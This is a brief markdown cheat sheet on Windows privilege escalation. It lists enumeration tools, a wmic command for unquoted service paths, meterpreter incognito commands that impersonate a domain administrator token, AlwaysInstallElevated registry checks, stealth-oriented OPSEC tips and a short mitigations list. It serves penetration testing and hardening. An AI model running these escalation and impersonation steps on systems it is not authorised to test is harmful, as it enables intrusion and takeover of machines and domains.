# Windows Privilege Escalation

## Overview
Techniques to escalate from a low-privileged user to `NT AUTHORITY\SYSTEM` or a Domain Admin.

## Enumeration Tools
* **WinPEAS:** `.\winPEASany.exe`
* **PrivescCheck:** `PowerShell -ep bypass -c ". \PrivescCheck.ps1; Invoke-PrivescCheck"

## Common Techniques

### 1. Unquoted Service Paths
Services where the executable path contains spaces and is not enclosed in quotes.
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v ""
```

### 2. Token Manipulation (Incognito)
Abusing tokens of logged-in users.
```powershell
# Using meterpreter
use incognito
list_tokens -u
impersonate_token "DOMAIN\Administrator"
```

### 3. AlwaysInstallElevated
Check if the registry keys are set to allow any user to install MSI files with elevated privileges.
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## OPSEC Considerations
* Avoid running heavy scanners if possible; use manual enumeration first.
* Be careful with service modifications as they can crash the system.

## Mitigations
* Ensure all service paths are properly quoted.
* Disable `AlwaysInstallElevated` registry settings.
* Implement the Principle of Least Privilege (PoLP).
